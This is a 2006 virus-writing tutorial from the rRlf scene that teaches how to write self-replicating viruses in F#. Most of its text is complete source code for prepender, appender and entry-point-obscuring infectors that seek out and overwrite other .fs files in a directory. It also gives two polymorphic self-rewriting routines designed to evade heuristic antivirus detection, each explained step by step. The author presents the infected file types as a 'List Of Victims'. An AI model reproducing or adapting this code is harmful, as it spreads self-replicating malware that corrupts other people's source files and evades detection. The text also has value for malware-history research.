@@ -1,0 +1,371 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************  A brief viral Introduction into F#  ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+
+  Index:
+  ******
+
+  0) Intro Words
+
+  1) File infection
+       a) Prepender
+       b) Appender
+       c) Entry Point Obscuring
+
+  2) Polymorphism
+       a) Number Changing
+       b) Space Games
+
+  3) Outro Words
+
+
+
+
+
+  0) Intro Words
+
+     In 2004/2005 Microsoft has started a new field of researching - with an
+     interesting idea: Combining a functional language with the .NET Framework.
+     The result of the research is a language called F# - a .NET variant of ML
+     with a core language similar to that of the OCaml programming language.
+     Usual languages like this (Calm, maybe LISP) are only useful for research
+     purpose, but Microsoft wants to change this additude.
+       I found the language first in an article of iX special 1/2006 called
+     "Ein neuer Halbton" by Oliver Mueller [I've got the magazine by my boss for
+     learning to use .NET with SQL 2005 - but well...). I was fascinated by the
+     idea and wanted to write a virus for it - didn't know what will happen. I've
+     tried it several times - without success - the language was just too strange.
+     Then one weekend I said to myself "I DO IT NOW" - so I've used ~30 of non-stop
+     researching, learning, reading, testing, coding... The problem is, that F#'s
+     documentation is very poor and that the interpreter's Error Messages are very
+     useless ("virus.fs(2,0): error: syntax error"), and the interpreter has still
+     some very strange bugs. After I had nearly a nervous breakdown (no shit -
+     imagine 30 hours of successless researching, repeated Gorillaz music, coffee,
+     a few beer and much cigaretts), I found some secrets, and was able to write
+     the world's first computer virus in F#. That was definitivly one of the great
+     moments, which you don't forget soon.
+
+       You can get F# here: http://research.microsoft.com/projects/ilx/fsharp.aspx
+
+     OK - enough about this strange story - see my researches now...
+
+
+
+
+
+  1) File infection
+
+     a) Prepender
+
+        Finally, after ~ 30 hours and 2,5 packs of cigaretts, the first F# virus
+        infected its victim. The code simply searchs for victims (*.fs files in
+        the current directory), checks if the victim is already infected, if not
+        it copies its own code before the victim code. For finding its own code,
+        it uses the 'Sys.argv.(1)' method. '.fs'-scripts will be opened this way:
+        'fsi filename.fs'. The method returns the second argument given in the
+        command line expression, which is the virus-filename. Now see the code...
+
+
+ - - - - - - - - - - - - - [ F# Prepender Virus Example ] - - - - - - - - - - - - -
+(* Archangel *)
+open System.IO
+let vfile = new StreamReader(Sys.argv.(1));;
+let vcode = (vfile.ReadToEnd()).Substring(0,526);;
+let vclose = vfile.Close();;
+let files = Directory.GetFiles(".","*.fs");;
+
+for i = 0 to files.Length-1 do
+  let hfile = new StreamReader(files.(i)) in
+  let hcode = hfile.ReadToEnd() in
+  let _ = hfile.Close() in
+  if (hcode.Substring(3,9)<>"Archangel") then begin
+    let hfile = new StreamWriter(files.(i)) in
+    let _ = hfile.Write(vcode+hcode) in
+    hfile.Close();
+  end
+done
+
+ - - - - - - - - - - - - - [ F# Prepender Virus Example ] - - - - - - - - - - - - -
+
+        - First it opens the 'System.IO' namespace, so we don't have to write that
+          expression again.
+        - Then it opens and reads its own code.
+        - Searchs for all f-sharp files in current directory
+        - Reads the code of the victim
+        - Checks if already infected
+        - If not: INFECT!
+        - Note: The empty last line is important!
+
+
+
+
+
+     b) Appender
+
+        The next infection type, as usual, is appending the code at the end of
+        of the file. There are just a view changes. Look at the code and you
+        will see:
+
+ - - - - - - - - - - - - - [ F# Appender Virus Example ] - - - - - - - - - - - - -
+(* Archangel *)
+open System.IO
+let vfile = new StreamReader(Sys.argv.(1));;
+let vall = vfile.ReadToEnd();;
+let vcode = vall.Substring(vall.Length-576,576);;
+vfile.Close();;
+let files = Directory.GetFiles(".","*.fs");;
+for i = 0 to files.Length-1 do
+  let hfile = new StreamReader(files.(i)) in
+  let hcode = hfile.ReadToEnd() in
+  let _ = hfile.Close() in
+  if (hcode.Substring(3,9)<>"Archangel") then begin
+    let hfile = new StreamWriter(files.(i)) in
+    let _ = hfile.WriteLine("(* Archangel *)") in
+    let _ = hfile.Write(hcode+vcode) in
+    hfile.Close();
+  end
+done
+ - - - - - - - - - - - - - [ F# Appender Virus Example ] - - - - - - - - - - - - -
+
+        - It prepares the infection: Includes 'System.IO', reads its own code, ect
+        - Searchs for any f-sharp files in the directory
+        - Reads the code and checks if it's already infected
+        - If not infected, open it for writing
+        - Write the infection marker at the start
+        - Then write the host code and, in the end, the virus code
+
+
+
+
+
+     c) Entry Point Obscuring
+
+        As usual, I present you as third infection type "Entry Point Obscuring".
+        This code first searchs a valueable place for infection, and writes its
+        own code to that position. At complex files this code fails, as it just
+        searchs for 0x0A+0x0D. But nevertheless, this all is prove-of-concept.
+        At this code you can see the strange world of functionality for the first
+        time (no direct counters, for-loops and if-statements as functions ect).
+        For deeper explanation of the code, see the end.
+        
+ - - - - - - - - - - - - - [ F# EPO Virus Example ] - - - - - - - - - - - - -
+(* Archangel *)
+open System.IO
+let vfile = new StreamReader(Sys.argv.(1));;
+let vall = vfile.ReadToEnd();;
+let vcode = vall.Substring(vall.IndexOf("(* Archangel *)"),1082);;
+vfile.Close();;
+let rand = new System.Random();;
+let pos = ref 0;;
+let nl = "
+";;
+let files = Directory.GetFiles(".","*.fs");;
+for i = 0 to files.Length-1 do
+  let oc = ref 0 in
+  let hfile = new StreamReader(files.(i)) in
+  let hcode = hfile.ReadToEnd() in
+  let _ = hfile.Close() in
+  if (hcode.IndexOf("(* Archangel *)")=(-1)) then begin
+    for j = 0 to hcode.Length-3 do
+      if (hcode.Substring(j,2)=nl) then begin
+        oc := !oc +1;
+      end
+    done;
+    pos := rand.Next(!oc);
+    for j = 0 to hcode.Length-3 do
+      if (!pos=0) then begin
+        let hwfile = new StreamWriter(files.(i)) in
+        let _ = hwfile.Write(hcode.Substring(0,j)^nl^vcode^nl^hcode.Substring(j,hcode.Length-j)) in
+        let _ = hwfile.Close() in
+        pos := 666;
+      end;
+      if (hcode.Substring(j,2)=nl) then begin
+        pos := !pos - 1;
+      end
+    done;
+  end
+done
+ - - - - - - - - - - - - - [ F# EPO Virus Example ] - - - - - - - - - - - - -
+
+         --> First it searchs it's own code by the .NET String Methode IndexOf.
+         --> It searchs for infectable files in the current directory.
+         --> It searchs for valueable places to infect in the victim file.
+         --> It gets a random place using .NET class System.Random() - method Next
+         --> It finds the random place again and includes the virus code there
+
+
+
+
+
+  2) Polymorphism
+
+     a) Number Changing
+
+        This script polymorphism technique could be very useful against simple
+        heuristic attacks. It changes a number in the code by chance ~33.3%.
+        The new calculation is a representation of the number - like:
+
+        1 = ((2/(0+1))-((3-1)-(1/1)))
+
+        It uses arichmetic operation ADD, SUB and MUL. It can not use DIV, because
+        the numbers represent integer, not float.
+
+        There have been several difficulties while writing the code, like you can
+        not change the counter of a for-loop (at least I didn't find a way). But
+        as I could solve any problem, you can see the code now:
+
+ - - - - - - - - - - [ F# Number Changing Polymorphism Example ] - - - - - - - - - -
+open System.IO
+let vfile=new StreamReader(Sys.argv.(1));;
+let vcode=vfile.ReadToEnd();;
+vfile.Close();;
+let vf=new StreamWriter(Sys.argv.(1));;
+let changeval=ref false;;
+let newcode=ref"";;
+let nstr=ref"";;
+let c=ref 0;;
+let l=ref 0;;
+let r=ref 0;;
+let s=ref "";;
+let rand=new System.Random();;
+let istrue num=if num=0 then false else true;;
+let isint num=if (num>="0"&&num<="9") then true else false;;
+let makedif num =
+  let rn=rand.Next(num)+1 in
+  let rr=rand.Next(3) in
+  if rr=0 then begin
+    r:=num-rn;
+    s:="+";
+  end;
+  if rr=1 then begin
+    r:=num+rn;
+    s:="-";
+  end;
+  if rr=2 then begin
+    r:=num*rn;
+    s:="/";
+  end;
+  "("^System.Convert.ToString(!r)^ !s^System.Convert.ToString(rn)^")";;
+for i=0 to vcode.Length-1 do
+  l:=1;
+  changeval:=false;
+  if (!c<vcode.Length) then begin
+    nstr:=vcode.Substring(!c,1);
+    if (isint(!nstr)) then begin
+      nstr:="";
+      while (isint(vcode.Substring(!c,1))) do
+        nstr:=!nstr^vcode.Substring(!c,1);
+        c:=!c+1;
+        l:=!l+1;
+      done;
+      c:=!c-1;
+      if (vcode.Substring(!c-6,5)<>"ToInt"&&vcode.Substring(!c-1,1)<>"\u0022"&& !nstr<>"0022"&&rand.Next(3)<>0) then begin
+        changeval:=true;
+      end;
+    end;
+  end;
+  if (!c)<vcode.Length then begin
+    if !changeval then
+      newcode:=!newcode^makedif(System.Convert.ToInt32(!nstr))
+    else
+      newcode:=!newcode^ !nstr
+  end;
+  c:=!c+1;
+done;
+vf.Write(!newcode);;
+vf.Close();;
+ - - - - - - - - - - [ F# Number Changing Polymorphism Example ] - - - - - - - - - -
+
+         --> First it searchs its own code.
+         --> It prepares all variables
+         --> It creates two sub-functions, for checking if a string is a number and
+             for create the representating calculation of a number
+         --> It goes throu the code and searchs all integer numbers
+         --> If the number is not part of "ToInt32"-method, if it is not '"', if
+             it is not a unicode and if rand.Next(3) is not zero, it changes the number
+         --> It writes the new code to the file.
+
+
+
+
+
+     b) Space Games
+
+        This kind of polymorphism uses the fact, that F# ignores multible spaces.
+        That means a command like this one:
+
+          let a = ref 0;;
+
+        is the same as 
+          let   a     =   ref   0;;
+
+        The code randomly adds and removes spaces from the code. It is quite simple,
+        but again you can easiely see the princip of functionality (in function istrue).
+
+
+ - - - - - - - - - - [ F# Space Games Polymorphism Example ] - - - - - - - - - -
+open System.IO
+ let vfile = new StreamReader(Sys.argv.(1));;
+ let vcode = vfile.ReadToEnd();;
+ vfile.Close();;
+ let vf = new StreamWriter(Sys.argv.(1));;
+ let a = ref 0 ;;
+ let newcode= ref "o" ;;
+ let rand = new System.Random();;
+ let istrue num = if num=0 then false else true;;
+ for i = 1 to vcode.Length-1 do
+   a := 0;
+   if(vcode.Substring( i - 1 , 2)="\u0020\u0020" && istrue(rand.Next(1))) then begin
+     newcode := !newcode^"\u0020";
+     let i = i + 1 in
+     a := 1;
+   end;
+   if(vcode.Substring( i , 1) = "\u0020" && istrue(rand.Next(2))) then begin
+     newcode := !newcode^"\u0020\u0020";
+     a := 1;
+   end;
+   if (!a = 0) then begin
+     newcode := !newcode ^ vcode.Substring( i , 1);
+   end;
+ done;
+ vf.Write(!newcode);;
+ vf.Close();;
+ - - - - - - - - - - [ F# Space Games Polymorphism Example ] - - - - - - - - - -
+
+         --> First it searchs its own code.
+         --> It checks every single character of the code.
+         --> If it's "\u0020" (Unicode: Space): 2/3 it adds another space
+         --> If it's "\u0020\u0020" (Unicode: double Space): 1/3 it removes a space
+         --> If no Space: add normal character to newcode
+         --> Write newcode to file
+
+
+
+
+
+  3) Outro Words
+
+     Another file extention has been added to my "List Of Victims" - and especially
+     about this one I'm really really happy. I proved myself that I can do everything
+     I want. I'm also very happy that I can stop working with that language now -
+     to be honest, I hate it - I nearly got crazy when I coded in that language,
+     without success first (and not that usual 'crazy' - but the real crazy).
+     Well, I will never do anything related to that language - trust me ;)
+
+
+
+                                                  - - - - - - - - - - - - - - -
+                                                    Second Part To Hell/[rRlf]  
+                                                    www.spth.de.vu
+                                                    spth@priest.com
+                                                    written in June-July 2006
+
+                                                    ...surrealistic viruswriter...
+                                                  - - - - - - - - - - - - - - -
